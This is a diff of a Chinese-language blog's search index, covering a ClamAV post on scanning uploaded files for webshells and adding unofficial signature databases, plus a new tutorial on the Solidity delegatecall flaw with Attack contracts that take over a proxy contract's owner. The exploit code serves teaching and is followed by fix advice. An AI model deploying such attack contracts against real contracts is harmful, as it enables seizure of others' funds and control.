@@ -5,6 +5,7 @@
     <url>/2024/12/14/ClamAV%E5%BC%80%E6%BA%90%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E5%AE%9E%E8%B7%B5/</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><img lazyload src="/images/loading.svg" data-src="/2024/12/14/ClamAV%E5%BC%80%E6%BA%90%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E5%AE%9E%E8%B7%B5/clamav_logo.jpg" class alt="alt text">
 
+
 <p>Clam AntiVirus（简称ClamAV）是一款免费且开源的杀毒软件，以其开放的源代码和社区驱动的更新机制而受到广泛欢迎。ClamAV主要应用于Linux和FreeBSD等类Unix操作系统，但其适用范围并不局限于此。该软件的病毒定义数据库与软件本身均由社区成员免费维护和更新，这使得ClamAV能够及时应对新出现的安全威胁。</p>
 <ul>
 <li><strong>开源性</strong> ：ClamAV的源代码完全公开，这意味着任何人都可以查看、修改和分发其代码。这种开放性不仅促进了软件本身的改进和发展，也为用户提供了高度的透明度和信任感。</li>
@@ -25,7 +26,7 @@
 
 <p>可设置定时任务定期进行病毒库更新</p>
 <h3 id="扫描测试"><a href="#扫描测试" class="headerlink" title="扫描测试"></a>扫描测试</h3><p>clamscan命令进行扫描，可以扫描文件或目录</p>
-<p><code>clamscan -r  /tmp               #clamscan [选项/参数] [文件/目录]</code></p>
+<p><code>clamscan -r  /tmp       #clamscan [选项/参数] [文件/目录]</code></p>
 <p>运行结果</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# clamscan -r  /tmp</span><br><span class="line">Loading:    10s, ETA:   0s [========================&gt;]    8.70M/8.70M sigs       </span><br><span class="line">Compiling:   2s, ETA:   0s [========================&gt;]       41/41 tasks </span><br><span class="line"></span><br><span class="line">/tmp/.viminfo: OK</span><br><span class="line">/tmp/1: Eicar-Signature FOUND</span><br><span class="line">/tmp/2.txt: OK</span><br><span class="line"></span><br><span class="line">----------- SCAN SUMMARY -----------</span><br><span class="line">Known viruses: 8702280</span><br><span class="line">Engine version: 1.4.1</span><br><span class="line">Scanned directories: 6</span><br><span class="line">Scanned files: 3</span><br><span class="line">Infected files: 1</span><br><span class="line">Data scanned: 0.00 MB</span><br><span class="line">Data read: 0.00 MB (ratio 0.00:1)</span><br><span class="line">Time: 13.692 sec (0 m 13 s)</span><br><span class="line">Start Date: 2024:12:19 02:06:52</span><br><span class="line">End Date:   2024:12:19 02:07:06</span><br></pre></td></tr></table></figure></div>
 
@@ -41,7 +42,7 @@
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS D:\code\report&gt; python .\remoteCallClamAv.py</span><br><span class="line">192.168.100.139 connection [OK]</span><br><span class="line">&#123;&#x27;/root/1&#x27;: (&#x27;FOUND&#x27;, &#x27;Eicar-Signature&#x27;)&#125;</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>Linux下检测应用上传的文件是否安全：应用系统文件上传功能采用非对象存储，需对用户上传的文件进行安全扫描，防止恶意文件的传播。而开源免费的ClamAV是Linux下病毒扫描的最佳选择。</p>
-<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>检测能力测试，测试过程中准备了几个一句话木马和其它病毒木马，发现一句话木马并未识别出来。因为应用系统的文件上传功能，一般是通过上传webshell，然后通过加载webshell进一步执行命令来控制服务器，所以当前测试的结果并没有达到预期的效果。如下：<br><code> clamscan -r /tmp</code>扫描结果</p>
+<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>检测能力测试，测试过程中准备了几个一句话木马和其它病毒木马，发现一句话木马并未识别出来。因为应用系统的文件上传功能，一般是通过上传webshell，然后通过加载webshell进一步执行命令来控制服务器，所以当前测试的结果并没有达到预期的效果。如下：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# clamscan -r  /tmp</span><br><span class="line">Loading:     9s, ETA:   0s [========================&gt;]    8.70M/8.70M sigs       </span><br><span class="line">Compiling:   3s, ETA:   0s [========================&gt;]       41/41 tasks </span><br><span class="line"></span><br><span class="line">/tmp/.viminfo: OK</span><br><span class="line">/tmp/1.asp: OK</span><br><span class="line">/tmp/cmd.jsp: OK</span><br><span class="line">/tmp/test: Eicar-Signature FOUND</span><br><span class="line">/tmp/2.php: OK</span><br><span class="line">/tmp/3.txt: OK</span><br><span class="line">/tmp/shell.php: OK</span><br><span class="line">/tmp/xiema.jpg: OK</span><br><span class="line">/tmp/phpinfo.php: OK</span><br><span class="line">/tmp/1.php4: OK</span><br><span class="line">/tmp/dama1.jpg: OK</span><br><span class="line"></span><br><span class="line">----------- SCAN SUMMARY -----------</span><br><span class="line">Known viruses: 8702280</span><br><span class="line">Engine version: 1.4.1</span><br><span class="line">Scanned directories: 6</span><br><span class="line">Scanned files: 11</span><br><span class="line">Infected files: 1</span><br><span class="line">Data scanned: 0.16 MB</span><br><span class="line">Data read: 0.08 MB (ratio 2.00:1)</span><br><span class="line">Time: 13.384 sec (0 m 13 s)</span><br><span class="line">Start Date: 2024:12:19 02:08:54</span><br><span class="line">End Date:   2024:12:19 02:09:07</span><br></pre></td></tr></table></figure></div>
 
 <h3 id="验证原因"><a href="#验证原因" class="headerlink" title="验证原因"></a>验证原因</h3><p>由于有的病毒木马能检测出来有的不能，ClamAV扫描病毒是基于病毒特征库进行，大概可以判断出是特征库的问题，下面进行验证。</p>
@@ -55,7 +56,7 @@
 <p>  指定刚刚生成的特征库进行扫描，发现可以识别出病毒，因此证明clamav的官方病毒特征库不够全面。</p>
 </li>
 </ul>
-<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="收集公开的非官方病毒库"><a href="#收集公开的非官方病毒库" class="headerlink" title="收集公开的非官方病毒库"></a>收集公开的非官方病毒库</h4><p>  本次直接搜集或通过github工具进行自动化搜集指定安全厂商的病毒库。</p>
+<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="收集公开的非官方病毒库"><a href="#收集公开的非官方病毒库" class="headerlink" title="收集公开的非官方病毒库"></a>收集公开的非官方病毒库</h4><p>  本次直接搜集或通过github工具进行自动化搜集安全厂商的病毒库。</p>
 <ul>
 <li><p>通过整理安全厂商公开的病毒库URL，修改配置文件<code>/usr/local/etc/freshclam.conf</code>的DatabaseCustomURL参数行，包含多个安全公司&#x2F;组织病毒库（SecuriteInfo，InterServer，RFXN，SaneSecurity ，Sanesecurity + Foxhole，winnow，bofhland，Porcupine，maldet，Malware.Expert，URLHaus ），如下：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#SecuriteInfo Signatures (Get them from your own account)</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.hdb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.ign2</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/javascript.ndb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/spam_marketing.ndb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfohtml.hdb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfoascii.hdb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfoandroid.hdb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfoold.hdb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfopdf.hdb</span><br><span class="line"># Below this line, the downloads will not work if you have Basic (free) account</span><br><span class="line">#DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo0hour.hdb</span><br><span class="line">#DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.mdb</span><br><span class="line">#DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.yara</span><br><span class="line">#DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.pdb</span><br><span class="line">#DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.wdb</span><br><span class="line"></span><br><span class="line">#InterServer Signatures</span><br><span class="line">DatabaseCustomURL http://sigs.interserver.net/interserver256.hdb</span><br><span class="line">DatabaseCustomURL http://sigs.interserver.net/interservertopline.db</span><br><span class="line">DatabaseCustomURL http://sigs.interserver.net/shell.ldb</span><br><span class="line">DatabaseCustomURL http://sigs.interserver.net/whitelist.fp</span><br><span class="line"></span><br><span class="line">#RFXN Signatures</span><br><span class="line">DatabaseCustomURL http://www.rfxn.com/downloads/rfxn.ndb</span><br><span class="line">DatabaseCustomURL http://www.rfxn.com/downloads/rfxn.hdb</span><br><span class="line">DatabaseCustomURL http://www.rfxn.com/downloads/rfxn.yara</span><br><span class="line"></span><br><span class="line">#SaneSecurity Signatures</span><br><span class="line">DatabaseCustomURL http://sigs.mailborder.com/sigwhitelist.ign2</span><br><span class="line">DatabaseCustomURL http://sigs.mailborder.com/sanesecurity.ftm</span><br><span class="line">DatabaseCustomURL http://sigs.mailborder.com/hackingteam.hsb</span><br><span class="line">DatabaseCustomURL http://sigs.mailborder.com/crdfam.clamav.hdb</span><br><span class="line">DatabaseCustomURL http://sigs.mailborder.com/bofhland_malware_attach.hdb</span><br><span class="line"></span><br><span class="line"># Sanesecurity + Foxhole</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/MiscreantPunch099-INFO-Low.ldb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/MiscreantPunch099-Low.ldb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/Sanesecurity_BlackEnergy.yara</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/Sanesecurity_sigtest.yara</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/Sanesecurity_spam.yara</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/badmacro.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/blurl.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_cracked_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_malware_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_malware_attach.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_phishing_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/crdfam.clamav.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/doppelstern-phishtank.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/doppelstern.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/doppelstern.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_all.cdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_all.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_filename.cdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_generic.cdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_js.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_mail.cdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/hackingteam.hsb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/junk.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/jurlbl.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/jurlbla.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/lott.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/malwarehash.hsb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/phish.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/rogue.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/scam.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/scamnailer.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/shelter.ldb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/sigwhitelist.ign2</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/spam.ldb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/spamattach.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/spamimg.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/spear.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/spearl.ndb</span><br><span class="line"></span><br><span class="line"># winnow</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow.attachments.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow.complex.patterns.ldb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_bad_cw.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_extended_malware.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_extended_malware_links.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_malware.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_phish_complete.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_phish_complete_url.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_spam_complete.ndb</span><br><span class="line"></span><br><span class="line"># bofhland</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_cracked_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_malware_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_phishing_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_malware_attach.hdb</span><br><span class="line"></span><br><span class="line"># Porcupine</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/porcupine.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/phishtank.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/porcupine.hsb</span><br><span class="line"></span><br><span class="line">#maldet</span><br><span class="line">DatabaseCustomURL https://www.rfxn.com/downloads/rfxn.ndb</span><br><span class="line">DatabaseCustomURL https://www.rfxn.com/downloads/rfxn.hdb</span><br><span class="line"></span><br><span class="line">#Malware.Expert Signatures</span><br><span class="line">DatabaseCustomURL http://cdn.malware.expert/malware.expert.ndb</span><br><span class="line">DatabaseCustomURL http://cdn.malware.expert/malware.expert.hdb</span><br><span class="line">DatabaseCustomURL http://cdn.malware.expert/malware.expert.ldb</span><br><span class="line">DatabaseCustomURL http://cdn.malware.expert/malware.expert.fp</span><br><span class="line"></span><br><span class="line">#URLHaus Signatures</span><br><span class="line">DatabaseCustomURL https://urlhaus.abuse.ch/downloads/urlhaus.ndb</span><br></pre></td></tr></table></figure></div>
@@ -63,7 +64,7 @@
 </li>
 <li><p>使用github的工具定期更新非官方的病毒库，也包含了市面上多个安全公司&#x2F;组织（securiteinfo，interserver，malware patrol，Sanesecurity, URLhaus）的病毒库，参考文档<code>https://github.com/rseichter/fangfrisch</code>，类似工具还有<code>https://github.com/extremeshok/clamav-unofficial-sigs</code>，不过此工具目前停止维护。</p>
 </li>
-<li><p>更新完所有病毒库后，重新进行扫描，检测能力有所提升</p>
+<li><p>更新完所有病毒库后，重新进行扫描</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost tmp]# clamscan -r /tmp</span><br><span class="line">Loading:    14s, ETA:   0s [========================&gt;]   13.10M/13.10M sigs       </span><br><span class="line">Compiling:   3s, ETA:   0s [========================&gt;]       42/42 tasks </span><br><span class="line"></span><br><span class="line">/tmp/.viminfo: OK</span><br><span class="line">/tmp/1.asp: OK</span><br><span class="line">/tmp/cmd.jsp: OK</span><br><span class="line">/tmp/test: &#123;HEX&#125;EICAR.TEST.3.UNOFFICIAL FOUND</span><br><span class="line">/tmp/2.php: sigs.InterServer.net.HEX.Topline.eval.post.428.UNOFFICIAL FOUND</span><br><span class="line">/tmp/3.txt: OK</span><br><span class="line">/tmp/shell.php: OK</span><br><span class="line">/tmp/xiema.jpg: YARA.eval_post.UNOFFICIAL FOUND</span><br><span class="line">/tmp/phpinfo.php: OK</span><br><span class="line">/tmp/1.php4: sigs.InterServer.net.HEX.Topline.eval.post.428.UNOFFICIAL FOUND</span><br><span class="line">/tmp/dama1.jpg: &#123;HEX&#125;php.gzbase64.inject.457.UNOFFICIAL FOUND</span><br><span class="line"></span><br><span class="line">----------- SCAN SUMMARY -----------</span><br><span class="line">Known viruses: 13096366</span><br><span class="line">Engine version: 1.4.1</span><br><span class="line">Scanned directories: 6</span><br><span class="line">Scanned files: 11</span><br><span class="line">Infected files: 5</span><br><span class="line">Data scanned: 0.08 MB</span><br><span class="line">Data read: 0.08 MB (ratio 1.00:1)</span><br><span class="line">Time: 20.480 sec (0 m 20 s)</span><br><span class="line">Start Date: 2024:12:19 04:49:34</span><br><span class="line">End Date:   2024:12:19 04:49:54</span><br></pre></td></tr></table></figure></div>
 <p>从检测结果看，检出率有一定提升，如需进一步提升检测效率，需购买商业或自研病毒库。</p>
 </li>
@@ -73,6 +74,43 @@
 ]]></content>
       <tags>
         <tag>ClamAV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Delegatecall漏洞</title>
+    <url>/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="call-和-delegatecall-的区别"><a href="#call-和-delegatecall-的区别" class="headerlink" title="call 和 delegatecall 的区别"></a>call 和 delegatecall 的区别</h3><ul>
+<li>call：调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境；</li>
+<li>delegatecall：调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境；</li>
+</ul>
+<h4 id="call"><a href="#call" class="headerlink" title="call"></a>call</h4><img lazyload src="/images/loading.svg" data-src="/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/call_01.jpg" class alt="alt text">
+<p>当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。</p>
+<h4 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall"></a>delegatecall</h4><img lazyload src="/images/loading.svg" data-src="/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/delegatecall_01.jpg" class alt="alt text">
+<p>当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。</p>
+<p>另外，当使用 delegatecall 函数进行外部调用涉及到 storage 变量的修改时是根据插槽位置来修改的而不是变量名。如下代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public c;</span><br><span class="line">    address public a;</span><br><span class="line"></span><br><span class="line">    function test() public returns (address b)&#123;</span><br><span class="line">        b = address(this);</span><br><span class="line">        a = b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public a;</span><br><span class="line">    address public c;</span><br><span class="line"></span><br><span class="line">    address Aaddress ;</span><br><span class="line"></span><br><span class="line">    constructor(address _Aaddress) &#123;</span><br><span class="line">        Aaddress = _Aaddress;   // 传入A合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testDelegatecall() public&#123;</span><br><span class="line">        Aaddress.delegatecall(abi.encodeWithSignature(&quot;test()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>A 合约中 address c 存储在 slot0 中，address a 存储在 slot1 中，反之在 B 合约中 address a 存储在 slot0 中，address c 存储在 slot1 中。当我们通过调用 B 合约中的 delegatecall 函数调用 A 合约中的 test 函数时，test 函数修改的是 A 合约中 slot1 这个插槽，所以代码运行的结果是 B 合约中的 address c 被修改了，因为在 B 合约中的 slot1 对应的正是 address c 这个地址存储的位置。</p>
+<h3 id="delegatecall-漏洞"><a href="#delegatecall-漏洞" class="headerlink" title="delegatecall 漏洞"></a>delegatecall 漏洞</h3><p>也叫代理合约所有者操纵漏洞，该漏洞允许攻击者操纵代理合约的所有者（下文中B合约为代理合约）。</p>
+<p>以下代码中，可以看到有两个合约，A 合约中通过 test() 函数用来修改合约的 owner，在 B 合约中存在 fallback 函数，fallback 函数的内容是使用 delegatecall 去调用 A 合约中的函数。我们通过 Attack 合约，利用 B.fallback() 触发 delegatecall 函数去调用 A.test() 将 B 合约中的 owner 改成 Attack 合约，从而控制 B 合约。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function test() public &#123;   // 这里方便演示漏洞效果使用public，实际中会有权限校验。</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    A public a;</span><br><span class="line"></span><br><span class="line">    constructor(A _a) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        a = A(_a);   // 传入A合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external  &#123;</span><br><span class="line">        address(a).delegatecall(msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public b;</span><br><span class="line"></span><br><span class="line">    constructor(address _b) &#123;</span><br><span class="line">        b = _b;    // 传入B合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        b.call(abi.encodeWithSignature(&quot;test()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="delegatecall-漏洞进阶版"><a href="#delegatecall-漏洞进阶版" class="headerlink" title="delegatecall 漏洞进阶版"></a>delegatecall 漏洞进阶版</h3><p>先看代码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        someNumber = _num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public a;    // slot 0</span><br><span class="line">    address public owner;   // slot 1</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    constructor(address _a) &#123;</span><br><span class="line">        a = _a;    // 传入A合约的地址</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        a.delegatecall(abi.encodeWithSignature(&quot;doSomething(uint256)&quot;, _num));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public a;    // slot 0</span><br><span class="line">    address public owner;  // slot 1</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    B public b;</span><br><span class="line"></span><br><span class="line">    constructor(B _b) &#123;</span><br><span class="line">        b = B(_b);   // 传入B合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        b.doSomething(uint(uint160(address(this))));   // 第一次调用替换B合约中的a地址为当前合约地址</span><br><span class="line">        b.doSomething(1);      // 第二次调用当前合约的doSomething()函数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>攻击流程：</p>
+<ul>
+<li>用户 部署 A 合约；</li>
+<li>用户 部署 B 合约并在构造函数中传入 A 合约的地址；</li>
+<li>攻击者 部署 Attack 合约并在构造函数中传入 B 合约的地址；</li>
+<li>攻击者调用 Attack.attack() 函数将 B 合约中的 owner 变为自己。</li>
+</ul>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>在使用 delegatecall 时应注意被调用合约的地址不能是可控的；</li>
+<li>在较为复杂的合约环境下需要注意变量的声明顺序以及存储位置。因为使用 delegatecall 进行外部调时会根据被调用合约的数据结构来用修改本合约相应 slot 中存储的数据，在数据结构发生变化时这可能会造成非预期的变量覆盖。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Solidity</tag>
+        <tag>智能合约安全</tag>
       </tags>
   </entry>
   <entry>
@@ -130,8 +168,8 @@
 <p>分母为0或负数的情况，以上代码不需要检查，添加unchecked可以节省Gas。</p>
 ]]></content>
       <tags>
-        <tag>智能合约安全审计</tag>
         <tag>Solidity</tag>
+        <tag>智能合约安全审计</tag>
       </tags>
   </entry>
   <entry>
@@ -196,8 +234,8 @@
 <h3 id="避免死代码"><a href="#避免死代码" class="headerlink" title="避免死代码"></a>避免死代码</h3><p>死代码是指永远也不会执行的代码，例如某个条件永远不可能满足，消耗了以太坊 gas 但没有任何作用。</p>
